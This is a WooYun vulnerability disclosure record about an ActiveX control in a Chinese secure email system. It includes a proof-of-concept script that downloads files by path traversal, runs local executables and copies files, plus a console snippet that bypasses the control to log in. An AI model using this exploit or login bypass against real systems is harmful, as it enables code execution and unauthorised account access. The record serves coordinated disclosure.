{"id": 5103, "wybug_id": "wooyun-2014-051243", "wybug_title": "某电子邮件系统安全控件文件下载、运行、覆盖等 + 绕过该控件可登录系统", "wybug_corp": "成都某公司", "wybug_author": "Bin.Y", "wybug_date": "2014-02-18 00:11", "wybug_open_date": "2014-04-04 00:11", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向公众公开  简要描述： 某电子邮件系统安全控件文件可以下载任意地址文件到%tmp%的任意相对路径可以运行本地任意文件并获得执行结果可以复制本地任意文件到%tmp%的任意相对路径可以判断本地任意文件是否存在可以判断本地任意文件大小可以绕过次安全控件登录该邮件系统 详细说明：  成都三零盛安信息系统有限公司龙信使Ⅱ安全增强电子邮件系统 ActiveX控件可以下载任意地址文件到%tmp%的任意相对路径SanMailBHO.HttpService：downloadFileWithUrl可以运行本地任意文件并获得执行结果SanMailBHO.MailServiceFactory：openLocalFile可以复制本地任意文件到%tmp%的任意相对路径可以判断本地任意文件是否存在SanMailBHO.MailAttachment：  SetFile  IsLocalFileExist  LoadLocalFile  SaveToNoPrompt可以判断本地任意文件大小SanMailBHO.MailServiceFactory：GetFileSize验证：mail.30san.com   漏洞证明：  \n<script>var mailService = new ActiveXObject(\"SanMailBHO.MailServiceFactory\"); var httpForm = new ActiveXObject(\"SanMailBHO.HttpForm\");var httpService = new ActiveXObject(\"SanMailBHO.HttpService\"); var usbkeyService = new ActiveXObject(\"SanMailBHO.UsbkeyService\"); var mailAttachment = new ActiveXObject(\"SanMailBHO.MailAttachment\"); mailService.init();httpService.transferType=\"http\";var host = \"www.baidu.com\";var port = \"80\";var url = \"/img/bdlogo.gif\";document.write(\"malware:http://www.baidu.com/img/bdlogo.gif\");document.write(\"<br>\");var localTempFilePath = httpService.downloadFileWithUrl(host,port,\"/img/bdlogo.gif\" ,\"..\\\\..\\\\bdlogo.gif\" );document.write(\"malware dl to:\" + localTempFilePath);document.write(\"<br>\");document.write(\"malware size:\"+mailService.GetFileSize(localTempFilePath ));document.write(\"<br>\");var virus = \"c:\\\\windows\\\\system32\\\\calc.exe\";document.write(\"virus:\"+virus);document.write(\"<br>\");mailAttachment.SetFile(virus);document.write(\"virus exist:\"+mailAttachment.IsLocalFileExist());document.write(\"<br>\");document.write(\"virus exec:\" + mailService.openLocalFile(virus));document.write(\"<br>\");document.write(\"virus read\");document.write(\"<br>\");mailAttachment.LoadLocalFile();document.write(\"virus write to:\");document.write(mailAttachment.SaveToNoPrompt(\"..\\\\test.exe\"));document.write(\"<br>\");</script>\n\n\n   修复方案：  不安装控件，绕过该控件登录系统在登录页打开控制台：\nwindow.mylogin = function(user,domain,psw){\tvar md5pwd = hex_md5(psw);    $.ajax({        type : \"POST\"        url : \"/servlet/LoginServlet\"        dataType : \"html\"        data : {\t          username : user + domain,\t          password : md5pwd,\t          isKeyLogin : true //           },        success : function(msg) {            var obj = eval(\"(\" + msg + \")\");            switch(obj.error)            {                case 0://登录成功                 case 206://首次登录 \"/html/authorization/firstlogin.html\"                case 207://密码过期 \"/html/authorization/overduelogin.html\"                case 208://密码被重置 \"/html/authorization/resetpwdlogin.html\"                    top.location = \"/html/frame/mainframe.html\";                default:                    console.log(msg);            }        }        error : function(msg){            console.log(msg);        }    });}\n然后mylogin（\"用户名\",\"@xxx.com\",\"密码\"）;即可成功登录\n\n   版权声明：转载请注明来源 Bin.Y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-02-23 11:27 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}